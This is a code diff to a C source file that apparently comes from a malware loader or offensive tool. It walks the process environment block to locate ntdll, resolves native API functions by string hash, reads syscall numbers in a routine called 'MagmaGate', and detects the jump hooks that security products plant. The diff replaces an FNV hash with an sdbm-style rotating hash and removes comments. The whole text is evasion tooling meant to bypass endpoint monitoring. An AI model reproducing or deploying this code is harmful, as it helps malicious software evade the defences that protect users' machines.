@@ -1,8 +1,4 @@
 #include "box.h"
-#include "Mapping.h"
-
-#define FNV_OFFSET 2166136261u
-#define FNV_PRIME  16777619u
 
 #define DOWN 32
 #define UP -32
@@ -10,7 +6,7 @@
 PVOID WalkPeb()
 {
 
-	PPEB pPeb = __readgsqword(0x60); // PEB -> x64
+	PPEB pPeb = __readgsqword(0x60);
 	PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)pPeb->Ldr;
 
 	INFO("PEB Address: [0x%p]", pPeb);
@@ -72,31 +68,22 @@ BOOL GetEAT
 
 }
 
-DWORD GetBaseHash
+DWORD sdbmrol16
 (
-	IN char* FuncName,
-	IN PVOID Ntdllbase,
-	IN PIMAGE_EXPORT_DIRECTORY pImgExport
+	IN PCHAR String
 )
 {
 
-	UINT_PTR base = (UINT_PTR)Ntdllbase;
-	UINT_PTR export = (UINT_PTR)base + pImgExport->AddressOfNames;
+	UINT hash = 0;
+	UINT StringLen = strlen(String);
 
-	UINT32 seed = (UINT32)((export >> 3) ^ (export << 13));
-
-	UINT32 hash = FNV_OFFSET;
-
-	hash ^= seed;
-	hash *= FNV_PRIME;
-
-	while (*FuncName)
+	for (UINT i = 0; i < StringLen; i++)
 	{
-		hash ^= (UINT8)*FuncName++;
-		hash *= FNV_PRIME;
+		hash = (hash << 16) | (hash >> (32 - 16));
+		hash = (toupper(String[i])) + (hash << 6) + (hash << 16) - hash;
+		hash = hash ^ i;
 	}
 
-	//INFO("Function: %s | Hash: %u", FuncName, hash);
 	return hash;
 
 }
@@ -110,8 +97,6 @@ PVOID GrabSSN
 
 {
 
-	// mov r10, rcx
-	// mov rcx, [SSN]
 	if (*((PBYTE)FuncAddr) == 0x4c
 		&& *((PBYTE)FuncAddr + 1) == 0x8b
 		&& *((PBYTE)FuncAddr + 2) == 0xd1
@@ -213,7 +198,7 @@ BOOL relative_jmp(IN PVOID FuncAddr)
 	for (DWORD i = 0; i < 32; i++)
 	{
 		if (*((PBYTE)FuncAddr + i) == 0xe9)
-			return TRUE; // found jmp instruction
+			return TRUE;
 	}
 
 	return FALSE;
@@ -223,11 +208,11 @@ BOOL absolute_jmp(IN PVOID FuncAddr)
 {
 
 	unsigned char jmp_stub[] = {
-	0xFF, 0x25 // jmp qword ptr...
+	0xFF, 0x25
 	};
 
 	if (memcmp(FuncAddr, jmp_stub, sizeof(jmp_stub)) != 0)
-		return FALSE; // no absolute_jmp
+		return FALSE;
 
 	INT32 Hookadr = *(INT32*)((PBYTE)FuncAddr + 2);
 	PBYTE ptr = (PBYTE)FuncAddr + 6 + Hookadr;
@@ -259,7 +244,7 @@ BOOL MagmaGate
 		if (FuncName[0] != 'N' || FuncName[1] != 't')
 			continue; // Skip Any Non-NTAPI Functions
 
-		if (ApiHash != GetBaseHash(FuncName, Ntdllbase, pImgDir))
+		if (ApiHash != sdbmrol16(FuncName))
 			continue;
 		WORD ord = Ordinal[i];
 		PVOID FuncAddr = (LPBYTE)Ntdllbase + Address[ord];
